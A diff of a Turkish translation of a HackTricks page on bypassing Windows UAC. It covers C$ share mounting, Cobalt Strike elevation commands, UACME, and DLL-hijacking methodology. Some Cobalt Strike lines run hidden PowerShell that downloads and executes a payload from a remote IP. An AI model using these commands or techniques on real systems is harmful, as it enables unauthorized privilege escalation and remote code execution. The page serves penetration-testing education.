 * [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 * [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
 ### **Çok** Temel UAC "atlatma" (tam dosya sistemi erişimi)
 
-Eğer Yöneticiler grubunda olan bir kullanıcıya sahip bir kabukunuz varsa, SMB aracılığıyla C$ paylaşımını **bağlayabilirsiniz** (dosya sistemi) ve yeni bir diskte yerel olarak monte edebilirsiniz ve dosya sistemi içindeki **her şeye erişebilirsiniz** (hatta Yönetici ana klasörüne bile).
+Eğer Administrators grubunda bir kullanıcı ile bir shell'e sahipseniz, **C$** paylaşımını SMB (dosya sistemi) üzerinden yeni bir diske yerel olarak **monte edebilirsiniz** ve **dosya sisteminin içindeki her şeye erişiminiz olur** (hatta Administrator ana klasörüne).
 
 {% hint style="warning" %}
-**Bu hile artık çalışmıyor gibi görünüyor**
+**Bu numaranın artık çalışmadığı görünüyor**
 {% endhint %}
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -124,9 +139,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### Cobalt Strike ile UAC atlatma
+### UAC atlatma ile cobalt strike
 
-Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesine ayarlanmamışsa çalışacaktır.
+Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesinde ayarlanmamışsa yalnızca çalışacaktır.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -138,18 +153,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** ve **Metasploit** ayrıca **UAC**'yi **atlamak** için birkaç modüle sahiptir.
+**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modül sunmaktadır.
 
 ### KRBUACBypass
 
-Belgeler ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Dokümantasyon ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde bulunmaktadır.
 
-### UAC atlatma saldırıları
+### UAC bypass exploitleri
 
-[**UACME**](https://github.com/hfiref0x/UACME) birkaç UAC atlatma saldırısının bir **derlemesi** olan. UACME'yi **visual studio veya msbuild kullanarak derlemeniz gerekecektir**. Derleme, birkaç yürütülebilir dosya oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`), **hangisine ihtiyacınız olduğunu bilmelisiniz.**\
-Bazı atlatmaların **kullanıcıya bir şeyler olduğunu bildiren diğer programları tetikleyebileceğinden** **dikkatli olmalısınız.**
+[**UACME**](https://github.com/hfiref0x/UACME), birkaç UAC bypass exploitinin **derlemesi**dir. **UACME'yi visual studio veya msbuild kullanarak derlemeniz gerektiğini** unutmayın. Derleme, birkaç çalıştırılabilir dosya (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır, **hangi dosyaya ihtiyacınız olduğunu bilmeniz gerekecek.**\
+**Dikkatli olmalısınız** çünkü bazı bypasslar, **kullanıcıya** bir şeylerin olduğunu **bildiren** bazı diğer programları **uyarabilir**.
 
-UACME'nin her tekniğin çalışmaya başladığı **derleme sürümüne sahip olduğunu**. Sürümünüzü etkileyen bir teknik arayabilirsiniz:
+UACME, her tekniğin çalışmaya başladığı **derleme sürümünü** içerir. Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -157,48 +172,61 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-### UAC Kullanıcı Hesabı Kontrolü
+Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) sayfasını kullanarak Windows sürüm `1607`'yi derleme sürümlerinden alabilirsiniz.
 
-Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) sayfadan Windows sürümü `1607`'yi derleme sürümlerinden alabilirsiniz.
+#### Daha Fazla UAC Bypass
 
-#### Daha Fazla UAC Atlatma
+**Burada** AUC'yi atlatmak için kullanılan **tüm** teknikler, kurbanla **tam etkileşimli bir kabuk** gerektirir (yaygın bir nc.exe kabuğu yeterli değildir).
 
-Burada kullanılan **tüm** teknikler, UAC'yi atlamak için **kurbanla tam etkileşimli bir kabuk gerektirir** (genel bir nc.exe kabuğu yeterli değildir).
-
-Bunu bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **işlem**e geçiş yapın:
+Bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **işleme** geçin:
 
 ![](<../../.gitbook/assets/image (863).png>)
 
-(_explorer.exe_ çalışmalı)
+(_explorer.exe_ çalışmalıdır)
 
-### GUI ile UAC Atlatma
+### GUI ile UAC Bypass
 
-Eğer bir **GUI'ye erişiminiz varsa, UAC isteğini** aldığınızda sadece kabul edebilirsiniz, gerçekten bir atlatıcıya ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak, UAC'yi atlatmanıza izin verecektir.
+Eğer bir **GUI'ye erişiminiz varsa, UAC istemini aldığınızda sadece kabul edebilirsiniz**, gerçekten bir bypass'a ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak UAC'yi atlatmanıza olanak tanır.
 
-Ayrıca, birisi tarafından kullanılan bir GUI oturumuna erişirseniz (potansiyel olarak RDP aracılığıyla) **yönetici olarak çalışacak bazı araçlar** bulunmaktadır, buradan örneğin **cmd'yi** doğrudan **yönetici olarak çalıştırabilirsiniz** ve tekrar UAC tarafından sorgulanmadan [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi. Bu biraz daha **gizli** olabilir.
+Ayrıca, birinin (potansiyel olarak RDP aracılığıyla) kullandığı bir GUI oturumu alırsanız, **yönetici olarak çalışan bazı araçlar** olacaktır; buradan örneğin **admin** olarak doğrudan bir **cmd** çalıştırabilirsiniz, böylece UAC tarafından tekrar istemde bulunulmaz, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **gizli** olabilir.
 
-### Gürültülü kaba kuvvet UAC atlatma
+### Gürültülü brute-force UAC bypass
 
-Gürültülü olmaktan endişe etmiyorsanız her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şey çalıştırabilir ve kullanıcı izinlerini yükseltmeyi kabul edene kadar istemeyi **sürekli talep edebilirsiniz**.
+Eğer gürültü yapmaktan rahatsız değilseniz, her zaman **şunu çalıştırabilirsiniz**: [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) bu **kullanıcı kabul edene kadar izinleri yükseltmek için istek yapar**.
 
-### Kendi atlatıcınız - Temel UAC atlatma metodolojisi
+### Kendi bypass'ınız - Temel UAC bypass metodolojisi
 
-**UACME'ye** bir göz atarsanız, **çoğu UAC atlatmanın Dll Hijacking zafiyetini** (genellikle kötü niyetli dll'yi _C:\Windows\System32_'ye yazma) istismar ettiğini göreceksiniz. [Bir Dll Hijacking zafiyeti bulmayı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/).
+**UACME**'ye bir göz atarsanız, **çoğu UAC bypass'ının bir Dll Hijacking zafiyetini kötüye kullandığını** göreceksiniz (esas olarak kötü amaçlı dll'yi _C:\Windows\System32_ içine yazarak). [Dll Hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/).
 
-1. **Otomatik yükselme** yapacak bir ikili bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
-2. **Procmon** ile **"NAME NOT FOUND"** olaylarını bulun ve **DLL Hijacking** için savunmasız olabilecek olayları belirleyin.
-3. Muhtemelen, kötü niyetli DLL'yi bazı **korunan yollara** (örneğin C:\Windows\System32 gibi) yazmanız gerekecektir. Bunu aşmak için şunları kullanabilirsiniz:
-   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek bütünlük seviyesinden çalıştırıldığı için korunan yollara bir CAB dosyasının içeriğini çıkarmayı sağlar.
+1. **Otomatik yükseltme** yapacak bir ikili dosya bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
+2. Procmon ile **DLL Hijacking**'e karşı savunmasız olabilecek "**NAME NOT FOUND**" olaylarını bulun.
+3. Muhtemelen bazı **korumalı yollar** (C:\Windows\System32 gibi) içinde yazma izinlerinizin olmadığı **DLL'yi** yazmanız gerekecek. Bunu aşmak için:
+   1. **wusa.exe**: Windows 7, 8 ve 8.1. Korumalı yollar içinde bir CAB dosyasının içeriğini çıkarmaya olanak tanır (çünkü bu araç yüksek bütünlük seviyesinden çalıştırılır).
    2. **IFileOperation**: Windows 10.
-4. DLL'nizi korunan yola kopyalamak ve savunmasız ve otomatik yükseltilmiş ikiliyi çalıştırmak için bir **betik** hazırlayın.
+4. Korumalı yola DLL'nizi kopyalamak ve savunmasız ve otomatik yükseltilmiş ikili dosyayı çalıştırmak için bir **script** hazırlayın.
 
-### Başka bir UAC atlatma tekniği
+### Başka bir UAC bypass tekniği
 
-**Otomatik yükseltilmiş bir ikili**nin, **kayıttan** bir **ikilinin** veya **komutun** **adını/yolunu** okumaya çalışıp çalışmadığını izlemek (bu bilgiyi **HKCU** içinde arıyorsa daha ilginç olur).
+Bir **autoElevated ikili dosyanın** **kayıttan** **okumaya** çalışıp çalışmadığını izlemeyi içerir; bu, **çalıştırılacak** bir **ikili dosyanın** veya **komutun** **adını/yolunu** arıyorsa daha ilginçtir (bu bilgi **HKCU** içinde aranıyorsa).
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>HackTricks'i Destekleyin</summary>
+
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek hacking ipuçlarını paylaşın.
+
+</details>
+{% endhint %}
